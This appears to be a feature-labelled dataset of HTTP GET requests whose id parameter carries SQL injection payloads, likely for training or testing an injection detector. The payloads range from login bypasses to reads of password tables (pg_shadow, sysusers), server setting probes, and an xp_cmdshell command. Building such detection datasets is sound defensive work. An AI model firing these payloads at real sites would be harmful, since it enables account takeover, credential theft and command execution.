42,1,200,3889,7,14,11,2,1,GET login/?id=admin' or '1'='1'-- HTTP/1.1
42,1,200,7086,7,14,11,2,1,GET login/?id=admin' or '1'='1'-- HTTP/1.1
42,1,200,6510,7,14,11,2,1,GET login/?id=admin' or '1'='1'-- HTTP/1.1
42,1,200,6498,7,14,11,2,1,GET login/?id=admin' or '1'='1'-- HTTP/1.1
42,1,200,6568,7,14,11,2,1,GET login/?id=admin' or '1'='1'-- HTTP/1.1
42,1,200,4468,7,14,11,2,1,GET login/?id=admin' or '1'='1'-- HTTP/1.1
57,1,200,3573,7,36,5,2,1,GET login/?id=select grantee from syscat.dbauth; HTTP/1.1
57,1,200,4243,7,36,5,2,1,GET login/?id=select grantee from syscat.dbauth; HTTP/1.1
57,1,200,4061,7,36,5,2,1,GET login/?id=select grantee from syscat.dbauth; HTTP/1.1
57,1,200,3293,7,36,5,2,1,GET login/?id=select grantee from syscat.dbauth; HTTP/1.1
57,1,200,7784,7,36,5,2,1,GET login/?id=select grantee from syscat.dbauth; HTTP/1.1
57,1,200,3328,7,36,5,2,1,GET login/?id=select grantee from syscat.dbauth; HTTP/1.1
57,1,200,6429,7,36,5,2,1,GET login/?id=select grantee from syscat.dbauth; HTTP/1.1
53,1,200,2292,7,30,7,1,2,GET ?id=exec master..xp_cmdshell 'net users' HTTP/1.1
53,1,200,1130,7,30,7,1,2,GET ?id=exec master..xp_cmdshell 'net users' HTTP/1.1
53,1,200,3061,7,30,7,1,2,GET ?id=exec master..xp_cmdshell 'net users' HTTP/1.1
53,1,200,4940,7,30,7,1,2,GET ?id=exec master..xp_cmdshell 'net users' HTTP/1.1
53,1,200,5541,7,30,7,1,2,GET ?id=exec master..xp_cmdshell 'net users' HTTP/1.1
53,1,200,4724,7,30,7,1,2,GET ?id=exec master..xp_cmdshell 'net users' HTTP/1.1
53,1,200,1104,7,30,7,1,2,GET ?id=exec master..xp_cmdshell 'net users' HTTP/1.1
36,1,200,4211,7,11,10,2,1,GET login/?id=') or ('a'='a HTTP/1.1
36,1,200,6556,7,11,10,2,1,GET login/?id=') or ('a'='a HTTP/1.1
36,1,200,1937,7,11,10,2,1,GET login/?id=') or ('a'='a HTTP/1.1
26,1,200,6558,7,7,6,2,1,GET login/?id='^' HTTP/1.1
26,1,200,6123,7,7,6,2,1,GET login/?id='^' HTTP/1.1
37,1,200,5636,7,19,4,1,0,GET ?id=select current_user; HTTP/1.1
37,1,200,4571,7,19,4,1,0,GET ?id=select current_user; HTTP/1.1
37,1,200,4385,7,19,4,1,0,GET ?id=select current_user; HTTP/1.1
37,1,200,7893,7,19,4,1,0,GET ?id=select current_user; HTTP/1.1
35,1,200,5397,7,4,6,1,1,GET ?id=' or         0=0 # HTTP/1.1
35,1,200,5360,7,4,6,1,1,GET ?id=' or         0=0 # HTTP/1.1
24,1,200,2086,7,7,4,2,1,GET login/?id=' HTTP/1.1
24,1,200,6595,7,7,4,2,1,GET login/?id=' HTTP/1.1
24,1,200,2760,7,7,4,2,1,GET login/?id=' HTTP/1.1
27,1,200,2751,7,7,6,2,1,GET login/?id=' -- HTTP/1.1
52,1,200,4700,7,30,6,2,1,GET login/?id=select * from syscat.tabauth; HTTP/1.1
52,1,200,1987,7,30,6,2,1,GET login/?id=select * from syscat.tabauth; HTTP/1.1
52,1,200,1840,7,30,6,2,1,GET login/?id=select * from syscat.tabauth; HTTP/1.1
52,1,200,1256,7,30,6,2,1,GET login/?id=select * from syscat.tabauth; HTTP/1.1
52,1,200,4493,7,30,6,2,1,GET login/?id=select * from syscat.tabauth; HTTP/1.1
52,1,200,6968,7,30,6,2,1,GET login/?id=select * from syscat.tabauth; HTTP/1.1
50,1,200,5596,7,29,6,1,1,GET ?id=select * from master..sysserverse HTTP/1.1
50,1,200,5696,7,29,6,1,1,GET ?id=select * from master..sysserverse HTTP/1.1
50,1,200,2546,7,29,6,1,1,GET ?id=select * from master..sysserverse HTTP/1.1
50,1,200,6216,7,29,6,1,1,GET ?id=select * from master..sysserverse HTTP/1.1
50,1,200,2492,7,29,6,1,1,GET ?id=select * from master..sysserverse HTTP/1.1
50,1,200,2496,7,29,6,1,1,GET ?id=select * from master..sysserverse HTTP/1.1
58,1,200,5209,7,35,8,1,1,GET ?id=select current_setting('data_directory'); HTTP/1.1
58,1,200,7401,7,35,8,1,1,GET ?id=select current_setting('data_directory'); HTTP/1.1
58,1,200,4423,7,35,8,1,1,GET ?id=select current_setting('data_directory'); HTTP/1.1
58,1,200,6546,7,35,8,1,1,GET ?id=select current_setting('data_directory'); HTTP/1.1
58,1,200,5043,7,35,8,1,1,GET ?id=select current_setting('data_directory'); HTTP/1.1
58,1,200,1283,7,35,8,1,1,GET ?id=select current_setting('data_directory'); HTTP/1.1
58,1,200,6325,7,35,8,1,1,GET ?id=select current_setting('data_directory'); HTTP/1.1
58,1,200,6504,7,35,8,1,1,GET ?id=select current_setting('data_directory'); HTTP/1.1
58,1,200,5288,7,35,8,1,1,GET ?id=select current_setting('data_directory'); HTTP/1.1
58,1,200,7751,7,35,8,1,1,GET ?id=select current_setting('data_directory'); HTTP/1.1
58,1,200,6191,7,35,8,1,1,GET ?id=select current_setting('data_directory'); HTTP/1.1
58,1,200,5258,7,35,8,1,1,GET ?id=select current_setting('data_directory'); HTTP/1.1
58,1,200,7868,7,35,8,1,1,GET ?id=select current_setting('data_directory'); HTTP/1.1
58,1,200,3315,7,35,8,1,1,GET ?id=select current_setting('data_directory'); HTTP/1.1
41,1,200,6250,7,20,5,1,1,GET ?id=select * from pg_shadow; HTTP/1.1
41,1,200,4439,7,20,5,1,1,GET ?id=select * from pg_shadow; HTTP/1.1
41,1,200,2358,7,20,5,1,1,GET ?id=select * from pg_shadow; HTTP/1.1
41,1,200,4225,7,20,5,1,1,GET ?id=select * from pg_shadow; HTTP/1.1
41,1,200,7405,7,20,5,1,1,GET ?id=select * from pg_shadow; HTTP/1.1
37,1,200,6827,7,19,4,1,0,GET ?id=select session_user; HTTP/1.1
37,1,200,3813,7,19,4,1,0,GET ?id=select session_user; HTTP/1.1
37,1,200,6519,7,19,4,1,0,GET ?id=select session_user; HTTP/1.1
32,1,200,6509,7,9,5,2,1,GET login/?id=' or 1=1¡V HTTP/1.1
32,1,200,6886,7,9,5,2,1,GET login/?id=' or 1=1¡V HTTP/1.1
32,1,200,6986,7,9,5,2,1,GET login/?id=' or 1=1¡V HTTP/1.1
31,1,200,5479,7,9,6,2,1,GET login/?id='or'1=1¡¬ HTTP/1.1
31,1,200,4555,7,9,6,2,1,GET login/?id='or'1=1¡¬ HTTP/1.1
31,1,200,6552,7,9,6,2,1,GET login/?id='or'1=1¡¬ HTTP/1.1
39,1,200,7057,7,9,8,1,1,GET ?id=' or 1=1 limit 1 -- -  HTTP/1.1
39,1,200,1625,7,9,8,1,1,GET ?id=' or 1=1 limit 1 -- -  HTTP/1.1
32,1,200,4458,7,6,9,1,1,GET ?id='or 1=1 or ''=' HTTP/1.1
32,1,200,1923,7,6,9,1,1,GET ?id='or 1=1 or ''=' HTTP/1.1
32,1,200,3032,7,6,9,1,1,GET ?id='or 1=1 or ''=' HTTP/1.1
32,1,200,2256,7,6,9,1,1,GET ?id='or 1=1 or ''=' HTTP/1.1
29,1,200,3010,7,8,7,1,1,GET ?id=') or true-- HTTP/1.1
29,1,200,6378,7,4,9,1,1,GET ?id=%' or '0'='0 HTTP/1.1
63,1,200,5031,7,37,6,3,3,GET ?id=select * from myfile;copy myfile to /tmp/test; HTTP/1.1
63,1,200,5237,7,37,6,3,3,GET ?id=select * from myfile;copy myfile to /tmp/test; HTTP/1.1
63,1,200,5384,7,37,6,3,3,GET ?id=select * from myfile;copy myfile to /tmp/test; HTTP/1.1
63,1,200,3916,7,37,6,3,3,GET ?id=select * from myfile;copy myfile to /tmp/test; HTTP/1.1
63,1,200,1154,7,37,6,3,3,GET ?id=select * from myfile;copy myfile to /tmp/test; HTTP/1.1
63,1,200,3871,7,37,6,3,3,GET ?id=select * from myfile;copy myfile to /tmp/test; HTTP/1.1
63,1,200,6497,7,37,6,3,3,GET ?id=select * from myfile;copy myfile to /tmp/test; HTTP/1.1
63,1,200,4138,7,37,6,3,3,GET ?id=select * from myfile;copy myfile to /tmp/test; HTTP/1.1
63,1,200,1262,7,37,6,3,3,GET ?id=select * from myfile;copy myfile to /tmp/test; HTTP/1.1
57,1,200,5027,7,34,8,1,1,GET ?id=select current_setting('log_statement'); HTTP/1.1
57,1,200,3292,7,34,8,1,1,GET ?id=select current_setting('log_statement'); HTTP/1.1
57,1,200,2165,7,34,8,1,1,GET ?id=select current_setting('log_statement'); HTTP/1.1
57,1,200,1735,7,34,8,1,1,GET ?id=select current_setting('log_statement'); HTTP/1.1
57,1,200,2064,7,34,8,1,1,GET ?id=select current_setting('log_statement'); HTTP/1.1
57,1,200,4683,7,34,8,1,1,GET ?id=select current_setting('log_statement'); HTTP/1.1
57,1,200,1004,7,34,8,1,1,GET ?id=select current_setting('log_statement'); HTTP/1.1
57,1,200,4746,7,34,8,1,1,GET ?id=select current_setting('log_statement'); HTTP/1.1
57,1,200,5317,7,34,8,1,1,GET ?id=select current_setting('log_statement'); HTTP/1.1
57,1,200,5175,7,34,8,1,1,GET ?id=select current_setting('log_statement'); HTTP/1.1
57,1,200,2285,7,34,8,1,1,GET ?id=select current_setting('log_statement'); HTTP/1.1
57,1,200,6800,7,34,8,1,1,GET ?id=select current_setting('log_statement'); HTTP/1.1
57,1,200,6841,7,34,8,1,1,GET ?id=select current_setting('log_statement'); HTTP/1.1
57,1,200,5396,7,34,8,1,1,GET ?id=select current_setting('log_statement'); HTTP/1.1
69,1,200,1318,7,45,8,2,1,GET login/?id=select current_setting('password_encryption'); HTTP/1.1
69,1,200,4815,7,45,8,2,1,GET login/?id=select current_setting('password_encryption'); HTTP/1.1
69,1,200,7170,7,45,8,2,1,GET login/?id=select current_setting('password_encryption'); HTTP/1.1
69,1,200,7274,7,45,8,2,1,GET login/?id=select current_setting('password_encryption'); HTTP/1.1
56,1,200,3279,7,33,8,1,1,GET ?id=select current_setting('virtual_host'); HTTP/1.1
56,1,200,1031,7,33,8,1,1,GET ?id=select current_setting('virtual_host'); HTTP/1.1
56,1,200,6052,7,33,8,1,1,GET ?id=select current_setting('virtual_host'); HTTP/1.1
56,1,200,4183,7,33,8,1,1,GET ?id=select current_setting('virtual_host'); HTTP/1.1
56,1,200,2965,7,33,8,1,1,GET ?id=select current_setting('virtual_host'); HTTP/1.1
56,1,200,7681,7,33,8,1,1,GET ?id=select current_setting('virtual_host'); HTTP/1.1
56,1,200,3147,7,33,8,1,1,GET ?id=select current_setting('virtual_host'); HTTP/1.1
56,1,200,5640,7,33,8,1,1,GET ?id=select current_setting('virtual_host'); HTTP/1.1
45,1,200,7346,7,25,4,2,1,GET login/?id=select * from sysusers HTTP/1.1
45,1,200,7027,7,25,4,2,1,GET login/?id=select * from sysusers HTTP/1.1
45,1,200,2105,7,25,4,2,1,GET login/?id=select * from sysusers HTTP/1.1
45,1,200,7798,7,25,4,2,1,GET login/?id=select * from sysusers HTTP/1.1
45,1,200,4713,7,25,4,2,1,GET login/?id=select * from sysusers HTTP/1.1
